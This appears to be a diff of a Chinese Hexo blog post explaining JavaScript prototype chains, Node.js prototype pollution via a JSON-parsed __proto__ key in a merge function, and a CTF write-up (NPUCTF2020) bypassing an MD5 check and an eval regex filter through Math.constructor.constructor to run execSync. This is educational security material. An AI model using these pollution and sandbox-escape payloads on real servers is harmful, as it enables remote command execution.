@@ -20,12 +20,12 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="[toc] NodeJs基础好像也没啥写的。。 child_process(创建子进程)分为异步和同步： 异步： 1234child_process.exec(command[, options][, callback])child_process.execFile(file[, args][, options][, callback])child_process.fork(modulePath[">
+    <meta name="description" content="[toc] NodeJs基础 好像也没啥写的。。 child_process(创建子进程) 分为异步和同步： 异步： 1234child_process.exec(command[, options][, callback])child_process.execFile(file[, args][, options][, callback])child_process.fork(mod">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Nodejs原型链污染">
 <meta property="og:url" content="http://example.com/2022/03/01/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html">
 <meta property="og:site_name" content="郁涛丶&#39;s Blog">
-<meta property="og:description" content="[toc] NodeJs基础好像也没啥写的。。 child_process(创建子进程)分为异步和同步： 异步： 1234child_process.exec(command[, options][, callback])child_process.execFile(file[, args][, options][, callback])child_process.fork(modulePath[">
+<meta property="og:description" content="[toc] NodeJs基础 好像也没啥写的。。 child_process(创建子进程) 分为异步和同步： 异步： 1234child_process.exec(command[, options][, callback])child_process.execFile(file[, args][, options][, callback])child_process.fork(mod">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/2022/03/01/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/Veur1v6GwiNs3bQ.png">
 <meta property="og:image" content="http://example.com/2022/03/01/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/SL3NypUdR5MlDAo.png">
@@ -494,60 +494,60 @@
                 <main class="main post-page">
     <article class="article-entry">
         <p>[toc]</p>
-<h1 id="NodeJs基础"><a href="#NodeJs基础" class="headerlink" title="NodeJs基础"></a>NodeJs基础</h1><p>好像也没啥写的。。</p>
-<h2 id="child-process-创建子进程"><a href="#child-process-创建子进程" class="headerlink" title="child_process(创建子进程)"></a>child_process(创建子进程)</h2><p>分为异步和同步：</p>
+<h1 id="nodejs基础">NodeJs基础</h1>
+<p>好像也没啥写的。。</p>
+<h2 id="child_process创建子进程">child_process(创建子进程)</h2>
+<p>分为异步和同步：</p>
 <p>异步：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">child_process.exec(command[, options][, callback])</span><br><span class="line">child_process.execFile(file[, args][, options][, callback])</span><br><span class="line">child_process.fork(modulePath[, args][, options])</span><br><span class="line">child_process.spawn(command[, args][, options])</span><br></pre></td></tr></table></figure>
-
 <p>同步：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">child_process.execFileSync(file[, args][, options])</span><br><span class="line">child_process.execSync(command[, options])</span><br><span class="line">child_process.spawnSync(command[, args][, options])</span><br></pre></td></tr></table></figure>
-
 <p>异步中，<code>spawn</code>是基础，其他的<code>fork</code>、<code>exec</code>、<code>execFile</code>都是基于<code>spawn</code>来生成的。</p>
-<h2 id="Javascript原型链"><a href="#Javascript原型链" class="headerlink" title="Javascript原型链"></a>Javascript原型链</h2><blockquote>
-<p>  <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain</a></p>
+<h2 id="javascript原型链">Javascript原型链</h2>
+<blockquote>
+<p>https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain</p>
 </blockquote>
-<h3 id="原型与原型链"><a href="#原型与原型链" class="headerlink" title="原型与原型链"></a>原型与原型链</h3><p>js中没有子类父类的概念，也没有类和实例，js中的继承使用”原型链”来实现。</p>
+<h3 id="原型与原型链">原型与原型链</h3>
+<p>js中没有子类父类的概念，也没有类和实例，js中的继承使用"原型链"来实现。</p>
 <p>JS中几乎所有的事物都是对象，如下代码：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;asdf&quot;</span>,    </span><br><span class="line">    <span class="string">&quot;blog&quot;</span>: <span class="string">&quot;https://asdf.github.io&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">a.name;</span><br><span class="line">a.blog;</span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br></pre></td></tr></table></figure>
-
 <p>其中访问对像的属性，可以有两种方式：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.name; </span><br><span class="line">a[<span class="string">&quot;name&quot;</span>];</span><br></pre></td></tr></table></figure>
-
-<h3 id="原型的定义和继承"><a href="#原型的定义和继承" class="headerlink" title="原型的定义和继承"></a>原型的定义和继承</h3><p>在javascript中一切皆对象，因为所有的变量，函数，数组，对象 都始于object的原型即object.prototype</p>
+<h3 id="原型的定义和继承">原型的定义和继承</h3>
+<p>在javascript中一切皆对象，因为所有的变量，函数，数组，对象 都始于object的原型即object.prototype</p>
 <p>每个实例对象（object）都有一个私有属性（称之为 __proto__ ）指向它的构造函数的原型对象（prototype）。即任何对象都是由一个构造函数创建的.</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">Father</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.first_name = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="keyword">this</span>.last_name = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">Son</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.first_name = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father()</span><br><span class="line"></span><br><span class="line">let son = <span class="keyword">new</span> Son()</span><br><span class="line">console.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`)</span><br><span class="line"><span class="comment">//Son类继承了Father类的last_name属性，最后输出的是Name: Melania Trump。</span></span><br></pre></td></tr></table></figure>
-
 <p>对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：(查找顺序)</p>
-<ol>
+<ol type="1">
 <li>在对象son中寻找last_name</li>
 <li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li>
 <li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li>
 <li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li>
 </ol>
 <blockquote>
-<p>  当谈到继承时，JavaScript 只有一种结构：对象。每个实例对象（object）都有一个私有属性（称之为 __proto__ ）指向它的构造函数的原型对象（prototype）。该原型对象也有一个自己的原型对象（__proto__），层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<strong>原型链</strong>中的最后一个环节。</p>
+<p>当谈到继承时，JavaScript 只有一种结构：对象。每个实例对象（object）都有一个私有属性（称之为 __proto__ ）指向它的构造函数的原型对象（prototype）。该原型对象也有一个自己的原型对象（__proto__），层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<strong>原型链</strong>中的最后一个环节。</p>
 </blockquote>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">name,age</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>a函数内容是a类的构造函数，其中<code>this.name</code>、<code>this.age</code>就是a类的属性。</p>
 <p>在JavaScript中，声明了一个函数a，然后浏览器就自动在内存中创建一个对象b，a函数默认有一个属性(原型对象:prototype)指向了这个对象b，b就是函数a的原型对象，简称原型。同时，对象b默认有属性constructor指向函数a。</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; a.prototype</span><br><span class="line">&#123;&#125; </span><br><span class="line">&gt; a.prototype.constructor</span><br><span class="line">[<span class="built_in">Function</span>: a]</span><br></pre></td></tr></table></figure>
-
 <p>创建一个对象a，对象a会默认有一个属性proto指向构造函数A的原型对象b</p>
 <p><code>A.prototype == a.__proto__</code></p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; <span class="keyword">let</span> a = <span class="keyword">new</span> A();</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; A.prototype = a.__proto__</span><br><span class="line">&#123;&#125;</span><br><span class="line">&gt; a.constructor</span><br><span class="line">[<span class="built_in">Function</span>: A]</span><br></pre></td></tr></table></figure>
-
 <p>当要使用或输出一个变量时：首先会在本层中搜索相应的变量，如果不存在的话，就会向上搜索，即在自己的父类中搜索，当父类中也没有时，就会向祖父类搜索，直到指向null，如果此时还没有搜索到，就会返回 undefined。</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; a.__proto__</span><br><span class="line">&#123;&#125;</span><br><span class="line">&gt; a.__proto__.__proto__</span><br><span class="line">[<span class="built_in">Object</span>: <span class="literal">null</span> prototype] &#123;&#125;</span><br><span class="line">&gt; a.__proto__.__proto__.__proto__</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/03/01/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/Veur1v6GwiNs3bQ.png" alt="img"></p>
+<figure>
+<img src="/2022/03/01/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/Veur1v6GwiNs3bQ.png" alt="img"><figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>由于对象之间存在继承关系，所以当我们要使用或者输出一个变量就会通过原型链向上搜索，当上层没有就会再向上上层搜索，直到指向 null，若此时还未找到就会返回 undefined</p>
 <p>图中的原型链是 <code>cat-&gt;Cat.protype-&gt;Object.prototype-&gt;null</code></p>
-<p><img src="/2022/03/01/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/SL3NypUdR5MlDAo.png" alt="img"></p>
-<h1 id="NodeJs原型链污染"><a href="#NodeJs原型链污染" class="headerlink" title="NodeJs原型链污染"></a>NodeJs原型链污染</h1><p>原型链污染就是修改其构造函数中的属性值，使其他通过该构造函数实例化出的对象也具有这个属性的值。</p>
+<figure>
+<img src="/2022/03/01/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/SL3NypUdR5MlDAo.png" alt="img"><figcaption aria-hidden="true">img</figcaption>
+</figure>
+<h1 id="nodejs原型链污染">NodeJs原型链污染</h1>
+<p>原型链污染就是修改其构造函数中的属性值，使其他通过该构造函数实例化出的对象也具有这个属性的值。</p>
 <p><code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果我们修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？demo:</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.__proto__.bar = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="built_in">console</span>.log(zoo.bar)</span><br></pre></td></tr></table></figure>
-
 <p>foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p>
 <p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
 <p>可能存在原型链污染的情况：</p>
@@ -557,64 +557,58 @@
 </ul>
 <p>以merge举例：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>这个key如果是<code>__proto__</code>，就有可能造成原型链污染。</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>
-
-<p>没有成功，这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p>
+<p>没有成功，这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, "__proto__": &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p>
 <p>那么，如何让<code>__proto__</code>被认为是一个键名呢？</p>
 <p>我们将代码改成如下：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>
-
 <p>成功污染。在JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>
-<h1 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h1><h2 id="NPUCTF2020-验证🐎"><a href="#NPUCTF2020-验证🐎" class="headerlink" title="[NPUCTF2020]验证🐎"></a>[NPUCTF2020]验证🐎</h2><p>好吧，其实这个不是原型链污染的题，做完才发现。。但还是学到很多</p>
+<h1 id="ctf题目">CTF题目</h1>
+<h2 id="npuctf2020验证">[NPUCTF2020]验证🐎</h2>
+<p>好吧，其实这个不是原型链污染的题，做完才发现。。但还是学到很多</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">&#x27;cookie-session&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">&#x27;./key.js&#x27;</span>).keys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> crypto.createHash(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">        .update(s)</span><br><span class="line">        .digest(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">&#x27;./index.html&#x27;</span>).toString();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> template.replace(<span class="string">&#x27;&#123;&#123;results&#125;&#125;&#x27;</span>, results.join(<span class="string">&#x27;&lt;br/&gt;&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;PHPSESSION&#x27;</span>, <span class="comment">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span></span><br><span class="line">    keys</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Object</span>);</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Math</span>);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">    <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">    <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first !== second &amp;&amp; md5(first + keys[<span class="number">0</span>]) === md5(second + keys[<span class="number">0</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                result = saferEval(req.body.e) || <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(e);</span><br><span class="line">                result = <span class="string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        results.unshift(<span class="string">&#x27;Not verified!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">        results.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    req.session.results = results;</span><br><span class="line">    res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">    res.send(fs.readFileSync(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">    req.session.admin = req.session.admin || <span class="number">0</span>;</span><br><span class="line">    res.send(render(req.session.results = req.session.results || []))</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
 <p>主要的就是<code>first.length === second.length &amp;&amp; first !== second &amp;&amp; md5(first + keys[0]) === md5(second + keys[0])</code>，然后绕过一个正则，</p>
 <p>可以使用正则可视化：</p>
-<p><img src="/2022/03/01/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20220301191754136.png" alt="image-20220301191754136"></p>
+<figure>
+<img src="/2022/03/01/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20220301191754136.png" alt="image-20220301191754136"><figcaption aria-hidden="true">image-20220301191754136</figcaption>
+</figure>
 <p>允许Math.xxx或者一堆字符，或者科学计数法。</p>
-<h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>首先是MD5的绕过。使用了相加，可能就是弱类型，<code>app.use(bodyParser.json());</code>指明了允许在Content-Type是application&#x2F;json时，可以以json格式解析数据，<code>&#123;&quot;e&quot;: &quot;1+1&quot;, &quot;first&quot;: &quot;1&quot;, &quot;second&quot;: [1]&#125;</code></p>
-<h3 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h3><p>允许Math，取Function，Function将我们获得的字符串作为函数执行</p>
+<h3 id="md5">MD5</h3>
+<p>首先是MD5的绕过。使用了相加，可能就是弱类型，<code>app.use(bodyParser.json());</code>指明了允许在Content-Type是application/json时，可以以json格式解析数据，<code>&#123;"e": "1+1", "first": "1", "second": [1]&#125;</code></p>
+<h3 id="正则绕过">正则绕过</h3>
+<p>允许Math，取Function，Function将我们获得的字符串作为函数执行</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">Math</span>.constructor</span><br><span class="line">[<span class="built_in">Function</span>: <span class="built_in">Object</span>]</span><br><span class="line">&gt; <span class="built_in">Math</span>.constructor.constructor</span><br><span class="line">[<span class="built_in">Function</span>: <span class="built_in">Function</span>]</span><br></pre></td></tr></table></figure>
-
 <p>可以执行</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a=<span class="built_in">Math</span>.constructor.constructor</span><br><span class="line"><span class="built_in">console</span>.log(a(<span class="string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;).toString()&quot;</span>)())</span><br></pre></td></tr></table></figure>
-
 <p>不允许字符出现，利用String.fromCharCode()</p>
